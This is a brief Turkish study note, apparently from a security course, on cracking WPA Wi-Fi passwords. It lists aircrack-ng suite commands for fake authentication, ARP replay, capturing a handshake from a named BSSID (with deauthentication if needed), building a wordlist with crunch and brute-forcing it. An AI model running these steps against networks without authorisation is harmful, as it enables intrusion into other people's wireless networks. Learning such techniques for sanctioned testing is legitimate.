### Ağlara Saldırmak

**_ WPA _**
WPA (Wi-Fi Protected Access), kablosuz ağlarda veri güvenliğini sağlamak için kullanılan bir şifreleme ve kimlik doğrulama protokolüdür.

-Handshake- kablosuz bir ağa (Wi-Fi) bağlanmak isteyen bir cihaz ile modem (router) arasında yapılan kimlik doğrulama işlemidir.

-Wordlist- siber güvenlikte ve özellikle brute-force saldırılarında kullanılan, içinde şifre olabilecek kelimelerin (parola tahminlerinin) bulunduğu metin dosyasıdır (.txt).

//terminalle password kırma

//Sahte Yetkilendirme ile ağda işlem yoksa sahte işlem yapıp IV alınabilir ve airodump yapılabilir
~ip addr //ip adres
~aireplay-ng --fakeauth 0 -a {modem mac} -h {kendi mac} wlan0mon
~aireplay-ng --arpreplay 0 -b {modem mac} -h {kendi mac} wlan0mon //ağda işlem yapılmış gibi

~iwconfig //monitor moda geç
~airodump-ng wlan0mon //ağ bilgileri al
~airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon //handshake üstte çıkar.Çıkmazsa ağdan atma saldırısı yap. Sonra çıkacaktır. handshake çıkmış halde write yazdırdığın dosya lazım

//Crunch kali de yüklüdür
~crunch 8 9 xy123 -o testwordlist // 8-9 haneli password, içerisinde xy123 geçen
~aircrack-ng handshake-file-01.cap -w testwordlist // üstteki dosyaları ekle kırmaya başlar
